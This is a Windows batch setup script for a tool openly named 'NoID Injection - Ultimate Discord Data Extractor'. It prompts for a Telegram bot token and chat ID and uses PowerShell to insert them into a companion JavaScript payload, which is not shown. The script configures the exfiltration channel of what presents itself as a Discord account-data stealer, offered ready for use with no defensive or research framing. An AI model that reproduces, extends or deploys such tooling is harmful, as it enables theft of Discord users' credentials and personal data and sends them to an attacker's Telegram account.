@echo off
:: NoID Injection - Ultimate Discord Data Extractor
:: Initialization Script
:: Developer: https://github.com/OriganOH
:: Version: 1.0.0

title NoID Injection - Initialization Script

echo *******************************************************
echo *       NoID Injection - Initialization Script        *
echo *       Ultimate Discord Data Extraction Tool         *
echo *******************************************************
echo.

:: Get Telegram Bot credentials
:get_credentials
echo.
echo [INPUT] Please enter your Telegram Bot Token:
set /p BOT_TOKEN=
echo.
echo [INPUT] Please enter your Telegram Chat ID:
set /p CHAT_ID=

:: Validate inputs
if "%BOT_TOKEN%"=="" (
    echo.
    echo [ERROR] Bot Token cannot be empty!
    echo.
    goto get_credentials
)

if "%CHAT_ID%"=="" (
    echo.
    echo [ERROR] Chat ID cannot be empty!
    echo.
    goto get_credentials
)

:: Update NoID-Injection.js with new credentials
powershell -Command "(Get-Content 'NoID-Injection.js') -replace 'NoID-Token', '%BOT_TOKEN%' | Set-Content 'NoID-Injection.js'"
powershell -Command "(Get-Content 'NoID-Injection.js') -replace 'NoID-ChatID', '%CHAT_ID%' | Set-Content 'NoID-Injection.js'"

:: Final message
echo.
echo [SUCCESS] NoID Injection setup completed successfully!
echo [INFO] Custom NoID-Injection.js file updated with your credentials.
echo [INFO] You can now test the NoID Injection tool.
timeout /t 5 >nul
exit
